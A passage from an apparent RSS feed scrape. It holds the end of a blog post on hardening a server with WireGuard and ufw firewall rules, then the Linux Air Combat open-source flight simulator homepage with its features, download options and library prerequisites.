</span></span></code></pre></div><p>Don’t forget to configure the server as a peer on the computer you’re connecting from. Make sure you can connect to SSH through the WireGuard IP.</p>
<h2 id="firewall">Firewall</h2>
<p>Your cloud provider probably has a firewall already. If you’re happy with that, allow WireGuard, block SSH, and call it a day. But if you don’t don’t like that firewall, you can install one on the server.</p>
<p>On Debian based systems, I use <code>ufw</code>. Install it with:</p>
<p>The first rule we need allows anyone to access the WireGuard port. Change <code>$WG_PORT</code> to whatever you configured in <code>/etc/wireguard/wg0.conf</code>:</p>
<div><pre tabindex="0"><code data-lang="sh"><span><span>sudo ufw allow in on eth0 to any port $WG_PORT proto udp
</span></span></code></pre></div><p>Also run <code>ip a</code> and make sure the interface you want to filter is actually <code>eth0</code>, sometimes it may not be.</p>
<p>Now we want to allow SSH on WireGuard:</p>
<div><pre tabindex="0"><code data-lang="sh"><span><span>sudo ufw allow in on wg0 to any port <span>22</span> proto tcp
</span></span></code></pre></div><p>And add any other ports you want open:</p>
<div><pre tabindex="0"><code data-lang="sh"><span><span>sudo ufw allow in on eth0 to any port <span>80</span> proto tcp
</span></span><span><span>sudo ufw allow in on eth0 to any port <span>443</span> proto tcp
</span></span></code></pre></div><p>When your rules are in place, cross your fingers and turn on <code>ufw</code>:</p>
<p>With any luck, SSH remains connected. Don’t log out until you confirm you can get a new SSH connection.</p>
<h2 id="next-steps">Next steps</h2>
<p>There are a few more things you should consider:</p>
<ul>
<li>Find a process to keep your system up to date. Debian’s <a href="https://wiki.debian.org/AutomatedUpgrade">Automatic Update</a> is one option, though you may want some oversight.</li>
<li>Most attacks won’t be against what we’ve covered in this guide, but against the applications you install next. Properly done, containers can limit the impact.</li>
</ul>
<p>Finally, you should automate the job of initializing your host. With practice, this process can be done manually in about 30 minutes, but your automation will be a couple of minutes at most. Manually typing the commands is also error-prone, and a few steps can lock you out if you aren’t careful.</p>
<p>If you aren’t sure where to start with automation, I suggest you start simple. For example, write an init script that gets your host to a known state before Ansible (or a similar tool) takes over.</p>
<p>If you want to use an init script, I have published some <a href="https://github.com/pboyd/initscripts">scripts</a> which do everything in this blog post, which you can use directly or as a base for what you really need.</p>

			</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Linux Air Combat: free, lightweight and open-source combat flight simulator (297 pts)]]></title>
            <link>https://askmisterwizard.com/2019/LinuxAirCombat/LinuxAirCombat.htm</link>
            <guid>36934029</guid>
            <pubDate>Sun, 30 Jul 2023 17:57:29 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://askmisterwizard.com/2019/LinuxAirCombat/LinuxAirCombat.htm">https://askmisterwizard.com/2019/LinuxAirCombat/LinuxAirCombat.htm</a>, See on <a href="https://news.ycombinator.com/item?id=36934029">Hacker News</a></p>
<div id="readability-page-1" class="page">
<a href="#HardwareCompatibility"><img alt="Hardware Compatibility" src="https://askmisterwizard.com/2019/LinuxAirCombat/HardwareCompatibility00.jpg"></a>&nbsp;&nbsp;
<a href="#Prerequisites"><img alt="Prerequisites" src="https://askmisterwizard.com/2019/LinuxAirCombat/Prerequisites00.jpg"></a>&nbsp;&nbsp; <a href="#Downloading"><img alt="Downloads" src="https://askmisterwizard.com/2019/LinuxAirCombat/ButtonDownloads00.jpg"></a> &nbsp; <a href="#Compiling"><img alt="Compiling" src="https://askmisterwizard.com/2019/LinuxAirCombat/Compiling00.jpg"></a>&nbsp;&nbsp; <a href="#VoiceComms"><img alt="Voice Comms" src="https://askmisterwizard.com/2019/LinuxAirCombat/VoiceComms00.jpg"></a>&nbsp;&nbsp; <a href="https://askmisterwizard.com/2019/LinuxAirCombat/LacFaq.htm"><img alt="FAQ" src="https://askmisterwizard.com/2019/LinuxAirCombat/FAQ00.jpg"></a>&nbsp;&nbsp; <a href="#HowTo"><img alt="HowTo" src="https://askmisterwizard.com/2019/LinuxAirCombat/HowTo00.jpg"></a>&nbsp;&nbsp; <a href="https://sourceforge.net/p/linuxaircombat/discussion" target="_blank"><img alt="Forums" src="https://askmisterwizard.com/2019/LinuxAirCombat/Forums.jpg"></a>&nbsp;&nbsp; <a href="https://askmisterwizard.com/2019/LinuxAirCombat/IntroducingLinuxAirCombat.htm"><img alt="Reviews" src="https://askmisterwizard.com/2019/LinuxAirCombat/Reviews.jpg"></a> &nbsp;&nbsp;<a href="https://askmisterwizard.com/2019/LinuxAirCombat/LacOnYouTube.htm"><img alt="YouTube playlists about LAC" title="YouTube playlists about LAC" src="https://askmisterwizard.com/2019/LinuxAirCombat/YouTube.jpg"></a> &nbsp; <a href="http://askmisterwizard.com/2019/LinuxAirCombat/LacOnlineDocs.htm"><img alt="Online Training" title="Online Training Resources" src="https://askmisterwizard.com/2019/LinuxAirCombat/Training00.jpg"></a>&nbsp;&nbsp; <a href="https://askmisterwizard.com/2019/LinuxAirCombat/Enhancements/LacEnhancements.htm"><img alt="Enhanced Art" src="https://askmisterwizard.com/2019/LinuxAirCombat/EnhancedArt00.jpg"></a>

&nbsp;
<p><big><b><big><big>LINUX AIR COMBAT</big></big></b><br>
</big></p>

<p>This is a free, open-source combat flight simulator developed by
AskMisterWizard.com for the LINUX community. Its roots came from the
well-known "classic" flight game known as "GL-117", but this new
incarnation has been extensively re-written and improved, and the focus
has changed from arcade gaming to World War II combat flight simulation.<br>
<big><small><small><small><big><big><big><big>
</big></big></big></big></small></small></small></big></p>

<p><big><small>Current Released versions: 9.15.&nbsp; Each version is
also available as an "</small></big><big><small>AppImage" containing a
single, universal, compiled
binary file ready for immediate use with no need to compile or
install&nbsp; (Learn more about AppImages from our forum <a href="https://sourceforge.net/p/linuxaircombat/discussion/lacandappimages/" target="_top">HERE</a>).
It runs nicely on almost any kind of computer that can run any popular
version of desktop Linux, ranging from Raspberry Pi through "Steam
Deck" and on up to super gaming-class machines.</small></big><big><small><br>
</small></big></p>

<p><big><small>Page updated 24Apr2023<br>
</small></big></p>

<p><a href="https://askmisterwizard.com/2019/LinuxAirCombat/P38andF4uHeadon.jpg"><img alt="P38 and F4u head-on" src="https://askmisterwizard.com/2019/LinuxAirCombat/P38andF4uHeadon.jpg"></a><a href="https://askmisterwizard.com/2019/LinuxAirCombat/Screenshots/Combat/MacciVsF4u/MacciCrop03.jpg"><span><img alt="Air to air combat over the desert." src="https://askmisterwizard.com/2019/LinuxAirCombat/Screenshots/Combat/MacciVsF4u/MacciCrop03.jpg"></span></a></p>

<p><a href="https://askmisterwizard.com/2019/LinuxAirCombat/Screenshots/Combat/MacciVsF4u/MacciCrop03.jpg"><span></span></a><a href="https://askmisterwizard.com/2019/LinuxAirCombat/P38andF4uHeadon.jpg">&nbsp;</a><a href="https://askmisterwizard.com/2019/LinuxAirCombat/Screenshots/Combat/P38/BlakesMission/Lac914/Apr2023BobTyClaire/vlcsnap-2023-04-20-08h41m21s293.png"><img alt="Target P38" title="Target P38" src="https://askmisterwizard.com/2019/LinuxAirCombat/Screenshots/Combat/P38/BlakesMission/Lac914/Apr2023BobTyClaire/Lac914TargetP38.jpg"></a><a href="https://askmisterwizard.com/2019/LinuxAirCombat/KillShot01.jpg"><br>
</a></p>

<div><p><small><span>(Click
the images to see a larger version)</span></small></p></div>

<p><a href="https://askmisterwizard.com/2019/LinuxAirCombat/Controls/SteamDeckPhoto02.jpg"><img alt="Linux Air Combat on Valve Steam Deck." src="https://askmisterwizard.com/2019/LinuxAirCombat/Controls/SteamDeckPhoto02.jpg"><span><span></span></span></a></p>



<p><span>New: LAC is now available in a
special, precompiled, optimized version for Valve Corporation's
fabulous "Steam Deck" portable gaming PC. All of the controls are
configured by default for best use, and it's easy to fly in LAC's
online, multi-player, server-based missions without ever needing a
keyboard. Even voice comms among players are supported!</span> <a href="http://askmisterwizard.com/2019/LinuxAirCombat/LacAndSteamDeck.htm" target="_top">CLICK HERE for more information.</a><br>
</p>





<p>LINUX
AIR COMBAT is now officially released and available in stable,
"production" quality, and official and semi-official LINUX Repositories
are beginning to support it! Universal compiled binary versions are now
available for unlimited testing!&nbsp;<small>
</small></p>

<big><small><small><small><big><big><big><big><br>
<small>LINUX AIR COMBAT is also known as "LAC", and this is the home
page for everything about LAC.<br>
</small></big></big></big></big></small></small></small></big><big><small><small><small><big><br>
</big></small></small></small></big><span>LAC
is very efficiently coded for "speed at any price". <span>We've
been watching development of the very popular, very affordable
"Raspberry Pi" computers. During the last few years these tiny little
computers have become increasingly powerful and, since December of
2020, we have confirmed that the current "Pi" has sufficient power to
run LAC
sweetly! </span></span><a href="https://askmisterwizard.com/2019/LinuxAirCombat/LacOnRaspberryPi.htm" target="_top">CLICK HERE</a> <span>for more details</span>.<br>

<span><span></span></span><br>

<big><small><small><small><big><a href="https://www.youtube.com/watch?v=ry0dOVkZnA4" target="_top">CLICK
HERE</a> </big><big>for a very brief YouTube
clip showing a low pass over an airfield and through a hangar while the
air raid siren blares.</big></small></small></small></big><br>

<small><a href="https://www.youtube.com/watch?v=-qi2l6wMNmU" target="_top">CLICK
HERE</a> </small><small>for a brief YouTube video with basic LAC
flight training.<br>
<a target="_top" href="https://www.youtube.com/watch?v=-AQVdKp7QYo&amp;list=PL1IYes9MY6lIlvyyMfGQ0BC75_u3v14tU&amp;index=80">CLICK
HERE</a> for important YouTube instruction on selection of online
targets.<br>
</small><a href="https://www.youtube.com/watch?v=h_XKktv8NVY&amp;t=105s" target="_blank"><small>
</small></a><small><a href="https://www.youtube.com/playlist?list=PL1IYes9MY6lLiEyOMpaNflcvDg7sRBTNE" target="_top">CLICK HERE</a> for a YouTube playlist with video tours
of all 54 of the World War II aircraft simulated by Linux Air Combat.<br>
<a href="https://www.youtube.com/watch?v=44K7BC1t-bg" target="_top">CLICK
HERE </a>for a YouTube clip showing what it's like to fly online
versus "Replay Blokes" when no other sentient players are active online.<br>
</small><small>
<a target="_top" href="https://youtu.be/kS_42nfSevk">CLICK
HERE</a> for a narrated, fun fighter furball in "Blake's Mission" from
July 2022</small><br>

<small><a href="https://www.youtube.com/watch?v=-4HVSM4xsJY&amp;list=PL1IYes9MY6lIlvyyMfGQ0BC75_u3v14tU&amp;index=66" target="_top">CLICK HERE</a> for a fun, 2-player network mission
example from July 2019.</small><br>

<a href="https://www.youtube.com/watch?v=Z38wtfhha2Q" target="_blank">
</a><small><a href="https://www.youtube.com/watch?v=Z38wtfhha2Q" target="_top">CLICK HERE</a>
for a comprehensive network mission example. This 37-minute clip shows
what it's like to fly a complex, strategic, multi-player mission with
lots of inter-player communication to develop and coordinate tactics.
This is a great clip for those needing an introduction to the
complexities, tools, and tactics used online.<br>
<a href="https://youtu.be/T6cOSV2OFkw" target="_top">CLICK HERE</a> for
a comprehensive YouTube tour of LAC's cockpit instruments.<br>
<a href="https://www.youtube.com/watch?v=pvnnoBD5qJI&amp;list=PL1IYes9MY6lIlvyyMfGQ0BC75_u3v14tU&amp;index=77" target="_top">CLICK HERE</a> for important training on LAC's
interplayer voice communication and associated keyboard commands
(YouTube).<br>
<a href="https://www.youtube.com/watch?v=HfxBKP41FeE&amp;list=PL1IYes9MY6lIlvyyMfGQ0BC75_u3v14tU&amp;index=78" target="_top">CLICK HERE</a> for basic training on LAC's standard,
simple, text-mode interplayer communication featuring our "Morse Radio"
(YouTube).<br>
<a href="https://www.youtube.com/watch?v=WwmVhT3ww8E&amp;list=PL1IYes9MY6lIlvyyMfGQ0BC75_u3v14tU&amp;index=79" target="_top">CLICK HERE</a> for advanced training on LAC's
"promotion" system, and associated Morse Radio commands (YouTube).<big><span></span></big></small><br>

<span>
</span><big><small><small><small><big><a href="https://www.youtube.com/watch?v=h_XKktv8NVY&amp;list=PL1IYes9MY6lIlvyyMfGQ0BC75_u3v14tU&amp;index=1" target="_top">CLICK HERE</a></big><span><big>
</big></span><big>for our YouTube Playlist with a huge collection of
video clips about LAC, documenting its development and improvement
during the past 6 years (latest clips at the end of the list).<br>
<a href="https://www.youtube.com/watch?v=xQxACV_S0d8&amp;list=PL1IYes9MY6lLQOwNTOV3iVLxqbWSrqO5I" target="_top">CLICK HERE</a> for our YouTube Playlist with exciting
online combat samples from 2022 (latest clips at the end of the list).<br>
<a href="https://www.youtube.com/playlist?list=PL1IYes9MY6lIp5aM0tAVE9u853Pk9dSpR" target="_top">CLICK HERE</a> for our YouTube Playlist with exciting
online combat samples from 2023 (latest clips at the end of the list).</big></small></small></small></big><span><big><big><big>LAC
is now MATURE and ready for widespread LINUX distribution!</big></big></big></span><span></span><span><p>

People have been asking to have
this included in mainstream LINUX distributions and repositories. We're
flattered to have that attention, and for almost 6 years we were
asking for your patience as we got it ready for "prime time". We are
very pleased to confirm that official development of stable,
"production-quality" Linux Air Combat is completely
FINISHED. We're DONE adding features, and the little bugs and tweaks of
recent releases have been so tiny as to confirm LAC's mature
status. All versions since November 15, 2019 remain mutually
interoperable, and recent versions have proven to be very stable on a
wide variety of LINUX distros.</p><p>

<a href="https://sourceforge.net/p/linuxaircombat/discussion/lacinrepositories/thread/a2a9ed15f5/" target="_top">CLICK HERE</a> for a discussion in our forums about LAC
in LINUX Repositories that ends with a list of Repositories already
supporting it.</p></span><span>Accordingly it is now
appropriate for
LINUX users to ask their own distribution managers and packagers to
include it. Then, if those people need help, refer them to the
discussion <a href="https://sourceforge.net/p/linuxaircombat/discussion/lacinrepositories/" target="_top">HERE</a>. They can also contact us
by email (webmaster@AskMisterWizard.com) and we will be
glad to assist. In the meantime, the best way to get LAC is to download
it from the prominent link advertised at the top of this web page, or
from <a href="https://sourceforge.net/projects/linuxaircombat/?source=navbar" target="_top">SourceForge.net</a></span><span>.</span><span></span><span><br>
</span><span></span><span><span></span></span>&nbsp;&nbsp;
<br>

<span>NEW SINCE AUG2022: Most new users will
no longer
find it necessary to compile LAC from source code. As of this writing
we have published compiled binary version 9.15 in
the well-known, universally compatible "AppImage" format and we have
seen widespread success and proven,
full
binary compatibility with the vast majority of Linux Distros for "x-86"
hardware. With this new "AppImage" option, obtaining and testing Linux
Air Combat is a simple matter of downloading one file, marking it as
executable, and running it. No compiling and no installation! Learn
more in our forums <a href="https://sourceforge.net/p/linuxaircombat/discussion/lacandappimages/" target="_top">HERE</a>.<br>
</span><big><small><small><small><span><big><br>
</big></span></small></small></small></big><b><big><big><small><small><small>
</small></small></small></big></big></b><span></span><big>Now available for free
Internet download,
this new, high-performance flight simulator is now "feature-complete",
and supports all of the
basics demanded by today's LINUX flight sim users, including:</big><br>

<ul>

  <li><span></span>Free and open source
distribution. The clean source code compiles
without modification on major LINUX distros.</li>
  <li>Precompiled binary version in the well-known, universally
compatible "AppImage" format is in widespread use.<br>
  </li>
  <li>Very smooth, simple, high-performance graphics yield high frame
rates
even on modest computer hardware (runs nicely on Raspberry Pi).<br>
  </li>
  <li>45 flight/view functions can be mapped to any detected joystick
axis, button, or keyboard key.</li>
  <li>Modern, multi-axis analog/digital joysticks and console game
controllers support precision
control of elevators, ailerons, rudder, throttle, etc.</li>
  <li>Mouse control of elevators, ailerons, and weapons for those
lacking a joystick.<br>
  </li>
  <li>54 different flyable
aircraft from World War II. </li>
  <li>A theoretical Jet fighter with performance similar to the Douglas
A4 "Skyhawk".<br>
  </li>
  <li>Industry-standard "Air Warrior" style viewsystem is easily
configurable for other view options.<br>
  </li>
  <li>Sophisticated flight model with stalls, high-speed
compressibility, high-G blackouts, torque rolls, low-speed control
fade, and redouts.</li>
  <li>Realistic high-altitude degredation of engine performance.</li>
  <li>Fuel consumption is proportional to engine load including
WEP/Afterburner effects.</li>
  <li>Flight performance is degraded when lugging heavy bombs,
missiles, or rockets.</li>
  <li>Flight performance is degraded when aircraft are damaged.<br>
  </li>
  <li>Simulated RADAR to help locate opponents.</li>
  <li>Players can hide from RADAR by flying at low altitudes (in
canyons and valleys).<br>
  </li>
  <li>Enemy airfields and RADAR facilities can be damaged or destroyed.<br>
  </li>
  <li>Simulated IFF to help Identify Friend verses Foe.</li>
  <li>Guns combat.</li>
  <li>WW2-era Air-to-Ground rockets.</li>
  <li>WW2-era bombs.<br>
  </li>
  <li>Free flight mission.</li>
  <li>Four tutorial missions with detailed audio narration to help
beginners get a quick start.<br>
  </li>
  <li>Online "Head to Head" mission suitable for air racing or combat
(2 players only. No server required.).</li>
  <li>Free, high performance Linux Air Combat Server is now available
at LacServer2.LinuxAirCombat.com.<br>
  </li>
  <li>Three "classic", ten-player Internet missions in various
terrains, with
strategic airfield combat (Internet and access to a free LAC Server
required).</li>
  <li>"Blake's Mission" for quick, pure air-to-air combat among 2 to 10
fighter aircraft without complications from ground guns or strategic
assets.</li>
  <li>"Peabody's Mission" for longer-lasting, deeper strategic
conflicts requiring destruction of additional airbases.<br>
  </li>
  <li>Additional, more sophisticated, multi-user missions are added
from time to time, as they are developed from the open source code.<br>
  </li>
  <li>When only one online player is active in ten-player missions,
"bots" are locally generated for opposition until another online player
joins.<br>
  </li>
  <li>Users can record "GunCamera films" and ask the Server to replay
them as persistent "Server Missions".</li>
  <li>32 distinct, online Realms, each supporting unique missions
and/or communities.</li>
  <li>Realm "1" constantly runs persistent Server "Strike" missions
with heavy bombers to escort, or to oppose.<br>
  </li>
  <li>User-loadable graphic aircraft models support the free, open,
well-known ".3ds" format.</li>
  <li>User-loadable background music, sound effects, and narration
files support industry-standard ".wav" format.</li>
  <li>"Talking Cockpit" can verbalize target location so you can hear
it without diverting your eyes.</li>
  <li>Innovative "Network Router Panel" on cockpit shows network
telemetry and comms data flow from other players.</li>
  <li>Best-of-breed network user management with interplayer status
messages on the cockpit panel.<br>
  </li>
  <li>Powerful integration with "Mumble" for world-class voice
communication between players.</li>
  <li>Dedicated Mumble server manages a rich heirarchy of voice radio
channels and online help.</li>
  <li>"Promotion" to team leadership allows one player to command
automated Mumble channel switching for entire teams.<br>
  </li>
  <li>Automated radio messages verbalize enemy airfield status when
Mumble Radio is properly tuned.<br>
  </li>
  <li>23 Comms-related functions can be mapped to almost any keyboard
key.<span></span></li>
  <li>Text-only, low-bandwidth comms option acts like a "Morse Code"
radio, generating real Morse code.</li>
  <li>Morse Code radio can apply interference filters to allow or
eliminate text messages from opposition.<br>
  </li>
  <li>Airfields with defensive guns challenge nearby opponents and
protect nearby allied aircraft.</li>
  <li>Airfield defenses can be damaged and degraded with bombs,
rockets, missiles, and/or machine guns.</li>
  <li>Damaged airfield defenses are gradually repaired by surviving
airfield maintenance personnel.</li>
  <li>Airfield repairs are accelerated if nearby skies are dominated by
allies, and stopped when dominated by opponents.<br>
  </li>
  <li>Air raid sirens blare loud on damaged airfields.<br>
  </li>
  <li>Bombers have autogunners that take shots at nearby hostile
fighters.</li>
  <li>"Norden" bombsight emulation makes precision, medium or high
altitude bombing possible.</li>
  <li>Realistic bomber climb rates:&nbsp; Heavily loaded bombers need a
long time to climb to altitudes high enough to avoid fighters.<br>
  </li>
  <li>Realistic bomb-run tactics make heavy bombers vulnerable to
opposing fighters during critical mission segments.<br>
  </li>
  <li>Heavy bombers can destroy an airfield in a single sortie if well
flown and undamaged by opposing fighters.</li>
  <li>Real-time, automated radio and RADAR warnings alert players when
their airfields are threatened by strategic bombers.</li>
  <li>Online users can choose their own unique "CommunityHandle" name,
and see the names of other players .<br>
  </li>
  <li>Log file stored on the player's computer keeps a detailed history
of all online victories.</li>
  <li>Stable source code is now available <a href="https://sourceforge.net/p/linuxaircombat/discussion/lacinrepositories/">for
porting into LINUX distributions and repositories.</a><br>
  </li>
  <li>Supported by an active development team for bug fixes.</li>
  <li>Extensive, high-quality online documentation is fully integrated
into the sim.</li>
  <li>Extensively documented on <a href="https://askmisterwizard.com/2019/LinuxAirCombat/LacOnYouTube.htm" target="_top">YouTube.</a></li>
</ul>

<a href="https://askmisterwizard.com/2019/LinuxAirCombat/Lac06p38LandedCockpitView.jpg"><img alt="Landed on runway" src="https://askmisterwizard.com/2019/LinuxAirCombat/Lac06p38LandedCockpitView.jpg"></a><br>

<span>On the runway, ready for takeoff,
after refuel, re-arm, and repair operations, near a friendly P38 and
behind a B29.</span><br>

<span><br>
</span>Linux Air Combat is free
software
that we donate to the world. We are writing and supporting this stuff
because we love
to do so. However,
there are limits on the amount of time we can spend on this project.
You can help! LAC is
advertising-supported. Our efforts are
funded by the modest advertising revenue we receive from these LAC
pages, related YouTube video clips, and from our web site
<a href="http://askmisterwizard.com/" target="_top">AskMisterWizard.com</a>.
All we ask is that you give our online publications a chance. All are
loaded with very high quality instructional videos about
technology, flight simulation, and networking. Please be fair with our
advertisers. We keep scripting to an absolute minimum, and we don't
clutter up the site with excessive ads. If you see an ad that you don't
like, please DON'T click on it. That will help our advertisers figure
out the kinds of ads that please our viewers. On the other hand, if you
see an ad that shows something of real interest to you, please consider
exploring it in detail and giving the advertiser a fair, honest share
of your attention. When you do that, everybody wins, and we can spend
more time improving and supporting LINUX AIR COMBAT.&nbsp; Thanks!<span><br>
</span><span><br>
</span><br>

<big><small><small><small><big><big><big><big><small>
<iframe src="https://www.youtube.com/embed/sBRyrBKGNPA" title="YouTube video player" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen="" frameborder="0" height="450" width="800"></iframe>&nbsp;&nbsp;
<iframe src="https://www.youtube.com/embed/ZSK-01vDyuQ" title="YouTube video player" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen="" frameborder="0" height="450" width="800"></iframe>
</small></big></big></big></big></small></small></small></big><big><small><small><small><span><big><br>
</big></span></small></small></small></big><span>
Two
narrated YouTube Movies showing network players enjoying a "Server
Mission" with the version of LAC that was current as of Jul2023. Lots
of
instructive radio banter, and lots of of air-to-air violence!</span><p>



<span><br>
</span><span></span>LAC is now the world's
leading open-source combat flight simulator for LINUX!</p><p>



<a href="https://askmisterwizard.com/2019/LinuxAirCombat/Lac01g.jpg"><img alt="Linux Air Combat V03.42 online screenshot" title="Linux Air Combat V03.42 online screenshot" src="https://askmisterwizard.com/2019/LinuxAirCombat/Lac01g.jpg"></a>&nbsp;&nbsp;
<a href="https://askmisterwizard.com/2019/LinuxAirCombat/Lac06p38AirstripOverflightChaseView.jpg"><img alt="Airstrip overflight" src="https://askmisterwizard.com/2019/LinuxAirCombat/Lac06p38AirstripOverflightChaseView.jpg"></a><br>

<span>Two
screen shots. First, an online skirmish versus a Mitsubishi
"Zero".&nbsp; Second, an airstrip overflight, using
external view. Click images to
see a larger, more detailed
version.</span><br>

<a href="https://askmisterwizard.com/2019/LinuxAirCombat/LacDefaultControls00.jpg"><img alt="Default Flight Controls" src="https://askmisterwizard.com/2019/LinuxAirCombat/IntroducingLac7p09/fig03a.jpg"></a>
<img alt="USB Game Controller" src="https://askmisterwizard.com/2019/LinuxAirCombat/UsbGameControllerMapping02.jpg">&nbsp; <a href="https://askmisterwizard.com/2019/LinuxAirCombat/LacKeyboard190825aB.jpg"><img alt="Keyboard Layout" src="https://askmisterwizard.com/2019/LinuxAirCombat/LacKeyboard190825aB.jpg"></a><a href="https://askmisterwizard.com/2019/LinuxAirCombat/LacMouse.jpg"><img alt="Mouse Pointer as LAC controller" src="https://askmisterwizard.com/2019/LinuxAirCombat/LacMouse.jpg"></a><a href="https://askmisterwizard.com/2019/LinuxAirCombat/LacKeyboard190825aB.jpg"> </a><br>

<span>Flight controls for LINUX AIR
COMBAT. The default configuration is set up for a numeric keypad,
standard keyboard, and the popular, inexpensive Logitech Extreme 3dPro
joystick as illustrated above. It is possible to reconfigure for a
different joystick, a USB console-style game controller, or to use a
generic "mouse pointer" instead. Keyboard keys are also reconfigurable
and/or
interchangeable with joystick buttons. In general
it is possible to assign almost any joystick button, controller button,
axis, or keyboard key to any arbitrary
flight or view function. It is also easy to
reconfigure a typical joystick "hat switch" to configure view
directions, etc. Further instruction is available in video tutorials
below, and from <a href="http://askmisterwizard.com/2019/LinuxAirCombat/Lac%20Basic%20Flight%20Training%20Resources.htm">these
links</a> that are also available within the sim.</span></p><p><a href="https://askmisterwizard.com/2019/LinuxAirCombat/Lac01f.jpg"><img alt="Linux Air Combat screenshot 1" src="https://askmisterwizard.com/2019/LinuxAirCombat/Lac01f.jpg"></a>&nbsp;&nbsp; <a href="https://askmisterwizard.com/2019/LinuxAirCombat/Lac01b.jpg"><img alt="Linux Air Combat screenshot 2" src="https://askmisterwizard.com/2019/LinuxAirCombat/Lac01b.jpg"></a><a href="https://askmisterwizard.com/2019/LinuxAirCombat/Lac01b.jpg">&nbsp; </a><br>
&nbsp;<i>Screenshots showing LINUX AIR COMBAT in action</i></p>

<b><big><big><small><small><big><big>Free, multiplayer online access is
now available, based on
new Linux Air Combat official Release V9.15.</big></big><br>
</small></small>
</big></big></b>
<p><big>In December of 2015,
AskMisterWizard.com announced availability of our new, free, open
source flight simulator for
LINUX,&nbsp; now known as "LINUX AIR COMBAT".</big><br>
</p>

<p>The first published version was alpha test number 1.99. Since then,
we've
continued to add features, fix bugs, and enhance the flight
models.&nbsp; As of this writing, the
current production version is 9.15 (for global installation in the /usr
filesystem for all users), supporting 54 aircraft (download link
below).&nbsp; Version 9.15 is also available in precompiled,
binary-only
format, configured for (almost) universal compatibility by virtue of
the well-known "AppImage" tools and format.<br>
</p>

<p><a target="_top" href="https://askmisterwizard.com/2019/LinuxAirCombat/LinuxAirCombatChangeLog.htm">Click
HERE</a><span>
to see the Linux Air Combat ChangeLog, with text and video summaries
documenting all of the changes that have been implemented in each
published version.</span><br>
</p>

<p>Most of our development work has been done on 64-bit
versions of the well-known "PcLinuxOs", "Ubuntu", and "Manjaro" Linux
distributions. Testing has
confirmed that some of the resulting, conventionally compiled binaries
are compatible with
some other, popular LINUX distributions. However, this binary
compatibility is dependent upon many
factors including the version of compiler and the versions of required
function libraries in use. <br>
</p>

<p><a href="https://sourceforge.net/p/linuxaircombat/discussion/lacandappimages/" target="_top">Click HERE</a>
for our discussion group focused on new versions of LAC that are
available as precompiled executables formatted for near-universal
compatibility with all popular desktop versions of LINUX according to
the well-known "AppImage" format.<br>
</p>

<p>Full
source code is available for download so that users of any LINUX
distribution can easily compile it for their use (See the "Compiling"
section
below). If your LINUX system is substantially out of the mainstream you
may find that none of our published binary versions will work for you.
In that case, compiling from
source code is generally the best way to
ensure compatibility.<br>
</p>

<span>This sim is still fully supported by
the
development team, but all of the planned features are now in place.</span>
We are
proud to declare that LAC now offers excellent hardware and software
compatibility, an easy-to-learn standard control layout, good
customizability, excellent frame rates, respectable and credible flight
models, exciting multiplayer combat,&nbsp; immersive multiplayer
missions,&nbsp; truly world-class
multi-user
player management with correspondingly powerful voice comms, and
near-universal binary compatibility to minimize any need to compile
from source code. This is
the most compatible online combat flight simulator ever published. It
works
well on virtually any LINUX desktop system ranging from Raspberry Pi on
up to monster gaming-class. The widest practical array of flight
controllers are also supported, ranging from keyboard/mouse on up
through USB "console-style" game controllers and traditional
aircraft-oriented joysticks.

<p>While we've been making all of these improvements, we've also
developed a "Linux Air Combat Server" that is now available for free
public use. In late June 2017, that server
completed the first phase of beta testing, and a high performance
hosting service now has it available at
LacServer2.LinuxAirCombat.com.&nbsp; Everybody with a recent copy
of Linux Air Combat
(since November of 2019) can now participate with us in any of our
free, ten-player online missions.&nbsp; <span><br>
</span></p>

<span><a name="Prerequisites"></a>Prerequisites
for running a compiled, binary version of LINUX AIR COMBAT<br>
</span><br>

This flight simulator is distributed in both source code and
binary executable formats for various LINUX distributions. (People that
want to compile it will find additional help in the next section of
this document.) For those that DON'T want to compile it, we offer three
options:<p>



<span>1 of 3: </span>Several popular
desktop LINUX distros offer LAC in their Repositories. (<a href="https://sourceforge.net/p/linuxaircombat/discussion/lacinrepositories/" target="_top">CLICK HERE</a> for more information).<br>

<span>2 of 3:</span> A binary "AppImage"
that works on most distros (<a href="https://sourceforge.net/p/linuxaircombat/discussion/lacandappimages/" target="_top">CLICK HERE</a> for more information). or:<br>

<span>3 of 3:</span> Precompiled binary
images bundled into our robust install kits that also include source
code.</p><p>



For
compatibility with the precompiled binary versions according to option
"3 of 3" above, LAC requires each of these
well-known, popular LINUX libraries and tools, which are generally
preinstalled in most major LINUX desktop distributions:</p><ul>

  <li>libfreeglut3</li>
  <li>libSDL1.2_0</li>
  <li>libSDL_mixer1.2_0</li>
  <li>libmesaglu1</li>
  <li>libmesa</li>
</ul>

<div><p>As of April 2018, some of those
prerequisites are NOT pre-installed on Ubuntu desktop Linux, but it is
very easy to obtain them using the well-known "apt-get" command.&nbsp; </p><big><big><small><small>For
example, the commands to install three of those prerequisite libraries,
issued into a bash command
shell, are:</small></small></big></big><br>
<big><big><small><small>
</small></small></big></big><br>
<big><big><small><small>
<span>sudo apt-get
install freeglut3</span></small></small></big></big><br>
<big><big><small><small><span>sudo apt-get
install libsdl1.2debian<br>
</span></small></small></big></big>
<big><big><small><small><span>sudo apt-get
install libsdl-mixer1.2</span></small></small></big></big></div>

<br>

<span>If LINUX is new to you, <a href="https://www.youtube.com/watch?v=8e8qsduHdmI&amp;list=PL1IYes9MY6lLtokuutRPKyOT_TqEu1svM" target="_top">CLICK HERE</a> to go to our YouTube playlist loaded
with introductory information that can get you started.</span><span><p>

Additional Prerequisites for compiling
your own version from the LINUX AIR COMBAT source code</p></span><p>



If you want to compile LAC, you will find that the well-organized
source code makes
this very easy, even for non-programmers. In addition to the
prerequisites listed above, you
will also need gcc (almost always present),&nbsp; and all of these
tools and libraries, which are generally NOT preinstalled in most major
LINUX desktop distributions:</p><ul>

  <li>gcc-c++</li>
  <li>Code::Blocks <span>(recommended, but
not required)</span><br>
  </li>
  <li>Libfreeglut-devel</li>
  <li>libSDL-devel (for SDL version 1.2)<br>
  </li>
  <li>libSDL_mixer-devel (also for SDL version 1.2)</li>
</ul>

<div><p>As of April 2018, some of those
compiling prerequisites are NOT pre-installed on Ubuntu desktop Linux,
but it is
very easy to obtain them using the well-known "apt-get" command.&nbsp; </p><big><big><small><small>For
